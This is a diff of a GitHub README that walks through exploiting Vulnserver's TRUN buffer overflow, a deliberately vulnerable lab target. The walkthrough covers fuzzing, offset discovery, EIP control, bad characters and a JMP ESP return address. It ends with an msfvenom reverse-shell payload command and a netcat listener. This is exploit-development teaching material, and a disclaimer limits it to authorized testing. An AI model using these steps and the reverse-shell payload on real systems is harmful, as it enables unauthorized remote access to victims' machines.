@@ -1,135 +1,203 @@
-📌 Repository Description (GitHub “About” section)
+# Buffer Overflow Exploit Walkthrough - Vulnserver (TRUN)
 
-A hands-on Windows buffer overflow exploitation lab using Vulnserver and Immunity Debugger.
-This repository documents the full exploit development process—from fuzzing to EIP control—using Python scripts and classic exploit development techniques.
+This repository contains a step-by-step guide and Python scripts to exploit a buffer overflow vulnerability in Vulnserver (`vulnserver.exe`) via the `TRUN` command.
 
+## 📋 Prerequisites
 
-📘 Repository Documentation (README.md)
+- **Vulnerable Application**: [Vulnserver](https://github.com/stephenbradshaw/vulnserver)
+- **Debugger**: [Immunity Debugger](https://github.com/kbandla/ImmunityDebugger/releases)
+- **Python 3**
+- **Kali Linux** (for pattern generation and shellcode creation)
 
-# Windows Buffer Overflow Exploitation (Vulnserver)
+## 🚀 Setup Before Each Step
 
-This repository contains Python scripts and documentation demonstrating a classic stack-based buffer overflow exploitation workflow against the vulnerable Windows application Vulnserver.
+Before starting any exploitation step (and after each crash), you must:
 
-The project focuses on understanding how memory corruption occurs, how control over execution flow is achieved, and how exploits are developed step by step using debugging tools.
+1. Restart `vulnserver.exe`.
+2. Run **Immunity Debugger as Administrator**.
+3. Attach the vulnerable process in Immunity via:  
+   `File → Attach → vulnserver.exe`.
+4. Click the **Play (▶)** button to start execution.
 
-⚠️ Educational use only. This software and techniques must not be used against systems you do not own or have explicit permission to test.
+---
 
+## 🔍 Step 1 — Fuzzing
 
-🎯 Objectives
+Fuzzing sends increasingly large data to the vulnerable program to trigger a crash and determine if a buffer overflow is possible.
 
-- Understand stack memory layout (ESP, EBP, EIP)
-- Perform fuzzing to identify crash points
-- Calculate the exact offset to overwrite EIP
-- Gain control of the instruction pointer
-- Prepare for shellcode execution
-- Learn Windows exploit development fundamentals
+**Target**: Vulnserver on port 9999 using the `TRUN` command.
 
+**Script**: [Fuzzing.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/Fuzzing.py)
 
-🧰 Environment & Tools
+The script sends an initial buffer of 100 `A` characters, then increments the size in a loop until Vulnserver crashes.
 
-Target Machine
-- Windows 10
-- Vulnserver (v1.00)
-- Immunity Debugger
-- Mona.py plugin
+> 💡 The crash indicates the buffer is overflowed and **EIP overwrite** is likely.
 
-Attacker Machine
-- Kali Linux
-- Python 3
-- Metasploit pattern tools
+---
 
+## 🧮 Step 2 — Finding the Offset
 
-🧠 Vulnerable Application: Vulnserver
+Once we know the crash occurs before 2700 bytes (we use 3000 for safety), we find the **exact offset** where EIP is overwritten.
 
-Vulnserver is a deliberately vulnerable Windows TCP server used for exploit development training.
+**Tools** (from Metasploit on Kali):
+- `pattern_create.rb`
+- `pattern_offset.rb`
 
-- Default port: 9999
-- Vulnerable command used: TRUN
-- Vulnerability type: Stack-based buffer overflow
+Located in:  
+`/usr/share/metasploit-framework/tools/exploit/`
 
+### Generate unique pattern:
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+```
 
-📂 Repository Structure
+### Use in script:
+[find_offset.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/find_offset.py)
 
-.
-├── fuzzing.py           # Fuzzer to trigger application crash
-├── pattern_send.py      # Sends cyclic pattern to find EIP offset
-├── crush_EIP.py         # Confirms EIP control using BBBB
-├── README.md            # Documentation
+After sending the pattern, note the **EIP value** (e.g., `386F4337`).
 
+### Find offset:
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337 -l 3000
+```
 
-🧪 Exploitation Workflow
+> ✅ Result: **2003 bytes** to reach EIP.
 
-1️⃣ Fuzzing
+---
 
-The fuzzing script sends increasingly large payloads to identify when the application crashes.
+## 🎯 Step 3 — Overwriting EIP
 
-Goal:
-- Confirm the application is vulnerable
-- Estimate crash size
+We verify control over EIP by sending:
+- 2003 `A` characters (padding)
+- 4 `B` characters (to overwrite EIP)
 
-Expected result:
-- Vulnserver crashes
-- Immunity Debugger shows access violation
+**Script**: [crush_EIP.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/crush_EIP.py)
 
+After execution, EIP should be `42424242` (`B` = `0x42`), confirming full control.
 
-2️⃣ Offset Discovery
+---
 
-A cyclic pattern is sent instead of repeated characters.
+## 🚫 Step 4 — Finding Bad Characters
 
-Steps:
-1. Generate pattern:
-   pattern_create.rb -l 3000
-2. Send pattern to Vulnserver
-3. Observe EIP value in Immunity Debugger
-4. Calculate offset:
-   pattern_offset.rb -q <EIP_VALUE>
+Some bytes can break shellcode execution. We test all hex bytes from `\x01` to `\xFF` (null byte `\x00` is always bad).
 
-Result:
-- Exact number of bytes needed to overwrite EIP
+**Script**: [find_badchars.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/find_badchars.py)
 
+### Method:
+1. Send payload with all bytes.
+2. After crash, in Immunity:  
+   Right-click **ESP → Follow in Dump**.
+3. Check if bytes appear in order (`01 02 03 ... FF`).
+4. Identify missing/altered bytes.
 
-3️⃣ EIP Control Confirmation
+> If sequence is intact: no bad chars (except `\x00`).
 
-After finding the offset, a payload is crafted:
+---
 
-- A * offset
-- B * 4 (EIP overwrite)
+## 📦 Step 5 — Finding a Reliable Module
 
-If successful:
-- EIP = 0x42424242
+We need a module without memory protections (DEP, ASLR, SafeSEH) to place a `JMP ESP` instruction.
 
-This confirms full control of execution flow.
+### Install Mona in Immunity:
+Download [mona.py](https://github.com/corelan/mona/blob/master/mona.py) and place in:  
+`C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\`
 
+### 1. List modules:
+In Immunity command bar:
+```
+!mona modules
+```
+Look for a module with all protections `False`.  
+Here: **essfunc.dll** is suitable.
 
-4️⃣ Next Exploitation Steps (Not Included Yet)
+### 2. Find JMP ESP opcode:
+Using `nasm_shell`:
+```
+jmp esp
+```
+Opcode = `FF E4`
 
-- Identify a JMP ESP instruction
-- Check for bad characters
-- Generate shellcode (e.g. reverse shell)
-- Redirect execution to shellcode
+### 3. Find JMP ESP address in module:
+```
+!mona find -s "\xff\xe4" -m essfunc.dll
+```
+Example address: `625011AF`
 
+### 4. Convert to Little Endian for x86:
+`625011AF` → `\xAF\x11\x50\x62`
 
-🧩 Key Concepts Covered
+### 5. Test return address:
+**Script**: [Return_address.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/Return_address.py)
 
-- Stack memory anatomy
-- Instruction Pointer overwrite
-- Little-endian addressing
-- Debugging with Immunity
-- Reliable exploit construction
+Replace 4 `B` with the Little Endian address.
 
+In Immunity:
+- Go to address `625011AF`.
+- Press `F2` to set a breakpoint.
+- Run script → breakpoint should hit, confirming valid address.
 
-⚠️ Disclaimer
+---
 
-This repository is strictly for educational and research purposes.
+## 🐚 Step 6 — Generating Shellcode
 
-Do not:
-- Attack real systems
-- Use these techniques without permission
-- Deploy in production environments
+With a valid `JMP ESP` return address, generate reverse shell shellcode using `msfvenom`.
 
+### Command:
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
+```
 
-🧠 Author
+### Options explained:
+- `-p windows/shell_reverse_tcp`: Windows reverse TCP payload.
+- `LHOST`: Attacker's IP (Kali).
+- `LPORT`: Listening port on attacker.
+- `EXITFUNC=thread`: Improves stability.
+- `-f c`: Output in C format for Python.
+- `-a x86`: Target architecture.
+- `--platform windows`: Target OS.
+- `-b "\x00"`: Exclude bad chars (only null byte here).
 
-Cybersecurity student exploring exploit development and low-level security concepts.
+### Final exploit script:
+[shell.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/shell.py)
 
-Learning by breaking — responsibly.
+Structure:
+```
+[ TRUN ][ 2003 A's ][ JMP ESP address ][ NOP sled ][ Shellcode ][ padding ]
+```
+
+---
+
+## ✅ Final Validation
+
+1. Start netcat listener on Kali:
+   ```bash
+   nc -lvnp 4444
+   ```
+2. Run `shell.py`.
+3. If successful, you'll get a reverse shell on the target machine.
+
+---
+
+## 📁 Scripts Overview
+
+- [Fuzzing.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/Fuzzing.py) – Step 1
+- [find_offset.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/find_offset.py) – Step 2
+- [crush_EIP.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/crush_EIP.py) – Step 3
+- [find_badchars.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/find_badchars.py) – Step 4
+- [Return_address.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/Return_address.py) – Step 5
+- [shell.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/shell.py) – Step 6
+
+---
+
+## ⚠️ Disclaimer
+
+This documentation is for **educational and authorized testing purposes only**. Do not use on systems you do not own or have explicit permission to test.
+
+---
+
+## 📚 References
+
+- [Vulnserver GitHub](https://github.com/stephenbradshaw/vulnserver)
+- [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
+- [Mona Py](https://github.com/corelan/mona)
+- [Metasploit](https://www.metasploit.com/)
